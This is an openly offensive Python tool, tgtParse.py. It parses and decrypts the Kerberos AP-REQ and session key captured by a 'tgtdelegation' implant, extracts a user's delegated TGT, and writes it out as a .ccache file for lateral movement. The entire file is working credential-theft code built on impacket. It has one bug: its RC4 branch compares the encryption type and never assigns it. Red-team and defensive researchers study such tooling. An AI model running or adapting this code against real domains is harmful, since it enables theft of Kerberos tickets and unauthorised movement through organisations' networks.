# tgtParse.py - Parse/decrypt tgtdelegation's AP-REQ response into a usable .ccache file for Kerberos lateral movement
# All credits go to dirkjanm (https://github.com/dirkjanm/krbrelayx/blob/master/lib/utils/kerberos.py)
# Author: Connor McGarr (@33y0re)
# I would have rather written this in C

from __future__ import unicode_literals
import sys

# Make sure Python3 is used
if sys.version[0] != '3':
    exit("[-] tgtParse.py requires Python3!")
try:
    # Import libs
    import struct
    import datetime
    from binascii import unhexlify, hexlify
    from pyasn1.type.univ import noValue
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.error import PyAsn1Error
    from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
    from impacket.krb5.gssapi import KRB5_AP_REQ, GSS_C_DELEG_FLAG
    from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
        Ticket as TicketAsn1, EncTGSRepPart, EncTicketPart, AD_IF_RELEVANT, Ticket as TicketAsn1, KRB_CRED, EncKrbCredPart
    from impacket.krb5.crypto import Key, _enctype_table, Enctype, InvalidChecksum, string_to_key
    from krbcredccache import KrbCredCCache
    from spnego import GSSAPIHeader_SPNEGO_Init, GSSAPIHeader_KRB5_AP_REQ
    from impacket import LOG
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    from impacket.krb5 import constants
    from impacket.krb5.kerberosv5 import getKerberosTGS
    import argparse
    import base64
    import os
except Exception as notInstalled:
    sys.exit("[-] tgtParse.py requires Impacket! Install command: pip3 install impacket.\n[-] Please try again!")
else:
    # Parse the args
    parser = argparse.ArgumentParser(description='Parser to parse and decrypt the AP-REQ response from tgtdelegation to obtain a usable .ccache for lateral movement with Kerberos.', epilog='Example: python3 tgtParse.py --apreq APREQBLOBB64 --sessionkey SESSIONKEYBLOBB64')

    # Add args
    parser.add_argument("--apreq", type=str, required=True, help='Base64 encoded AP-REQ output from tgtdelegation. Reference BOFs/Lateral Movement/README.md for more information.')
    parser.add_argument("--sessionkey", type=str, required=True, help='Base64 encoded Kerberos session key from tgtdelegation. Reference BOFs/Lateral Movement/README.md for more information.')
    parser.add_argument("--etype", type=str, required=True, help='Encryption type returned from tgtdelegation output. Reference BOFs/Lateral Movement/README.md for more information')
    args = parser.parse_args()

    # Store the files
    tempToken = args.apreq
    tempsessionKey = args.sessionkey
    encryptionType = args.etype

    # Base64 decode
    token = base64.b64decode(tempToken)
    sessionKey = base64.b64decode(tempsessionKey)

    # Make sure we can parse the AP-REQ
    try:
        payload = decoder.decode(token, asn1Spec=GSSAPIHeader_KRB5_AP_REQ())[0]
    except PyAsn1Error:
        raise Exception('Error obtaining Kerberos data')

    # Parse the AP-REQ
    decodedTGS = payload['apReq']

    # Get the encryption type from tgtdelegation and dynamically set it here
    # 18 = AES256
    # 17 = AES128
    # 23 = RC4
    if encryptionType == "AES256":
        etype = 18
    elif encryptionType == "AES128":
        etype = 17
    elif encryptionType == "RC4":
        etype == 23
    else:
        print("Could not determine the encryption type!")
        sys.exit()

    # Store the encryption key
    cipherText = decodedTGS['authenticator']['cipher']
    key = Key(etype, sessionKey)
    newCipher = _enctype_table[int(decodedTGS['authenticator']['etype'])]

    # Obtain plaintext from the Authenticator
    plainText = newCipher.decrypt(key, 11, cipherText)
    authenticator = decoder.decode(plainText, asn1Spec=Authenticator())[0]

    # Verify the checksum
    cksum = authenticator['cksum']
    if cksum['cksumtype'] != 32771:
        raise Exception('Checksum is not KRB5 type: %d' % cksum['cksumtype'])

    # Get the creds
    dlen = struct.unpack('<H', bytes(cksum['checksum'])[26:28])[0]
    deldata = bytes(cksum['checksum'])[28:28+dlen]
    creds = decoder.decode(deldata, asn1Spec=KRB_CRED())[0]
    subkey = Key(authenticator['subkey']['keytype'], bytes(authenticator['subkey']['keyvalue']))
    newCipher = _enctype_table[int(creds['enc-part']['etype'])]
    plainText = newCipher.decrypt(key, 14, bytes(creds['enc-part']['cipher']))
    enc_part = decoder.decode(plainText, asn1Spec=EncKrbCredPart())[0]

    for i, tinfo in enumerate(enc_part['ticket-info']):
        username = '/'.join([str(item) for item in tinfo['pname']['name-string']])
        realm = str(tinfo['prealm'])
        fullname = '%s@%s' % (username, realm)
        sname = Principal([str(item) for item in tinfo['sname']['name-string']])
        print('[+] Identified ticket for', fullname)
        ticket = creds['tickets'][i]
        filename = '%s' % (fullname)
        ccache = KrbCredCCache()
        ccache.fromKrbCredTicket(ticket, tinfo)
        if sys.platform == "win32":
            try:
                ccache.saveFile(filename + '.ccache')
                print("[+] Successfully extracted the TGT! Saved as:", filename + '.ccache!')
                finalPath = (os.path.abspath(filename) + '.ccache')
                print("Local path to usable .ccache:", finalPath)
            except Exception as fail:
                print(fail)
        else:
            try:
                ccache.saveFile(os.environ.get('HOME')  + "/" + filename + '.ccache')
                print("[+] Successfully extracted the TGT! Saved as:", filename + '.ccache!')
                finalPath = (os.environ.get('HOME')  + "/" + filename + '.ccache')
                print("Local path to usable .ccache:", finalPath)
            except Exception as fail:
                print(fail)
